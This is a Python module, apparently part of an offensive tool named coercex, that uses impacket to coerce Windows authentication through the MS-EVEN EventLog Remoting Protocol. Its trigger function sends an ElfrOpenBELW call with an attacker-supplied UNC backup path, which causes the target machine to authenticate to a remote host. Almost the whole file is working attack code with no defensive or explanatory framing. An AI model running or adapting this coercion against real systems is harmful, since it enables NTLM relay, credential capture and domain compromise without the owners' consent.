"""MS-EVEN (EventLog Remoting Protocol) coercion methods.

Uses the EventLog service to coerce authentication via log backup paths.
"""

from __future__ import annotations

import random

from impacket.dcerpc.v5 import even
from impacket.dcerpc.v5.dtypes import NULL

from coercex.methods.base import CoercionMethod, PipeBinding

EVEN_UUID = "82273fdc-e32a-18c3-3f78-827929dc23ea"

EVEN_PIPES = [
    PipeBinding(pipe=r"\PIPE\eventlog", uuid=EVEN_UUID, version="0.0"),
]

# MS-EVEN uses the \\?\UNC\ device path format
EVEN_PATH_STYLES = [
    ("smb", "unc_device"),
]

PROTOCOL_SHORT = "MS-EVEN"
PROTOCOL_LONG = "[MS-EVEN]: EventLog Remoting Protocol"


def _trigger_elfr_open_belw(dce, path, target):
    """ElfrOpenBELW (opnum 9) - Open backup event log with UNC path."""
    # Strip null terminator if present; EVEN handles it differently
    clean_path = path.rstrip("\x00")
    request = even.ElfrOpenBELW()
    request["UNCServerName"] = NULL
    request["BackupFileName"] = clean_path
    request["MajorVersion"] = random.randint(0, 100)
    request["MinorVersion"] = random.randint(0, 100)
    dce.request(request)


def get_methods() -> list[CoercionMethod]:
    """Return all MS-EVEN coercion methods."""
    return [
        CoercionMethod(
            protocol_short=PROTOCOL_SHORT,
            protocol_long=PROTOCOL_LONG,
            function_name="ElfrOpenBELW",
            opnum=9,
            vuln_args=["BackupFileName"],
            pipe_bindings=list(EVEN_PIPES),
            path_styles=list(EVEN_PATH_STYLES),
            trigger_fn=_trigger_elfr_open_belw,
        ),
    ]
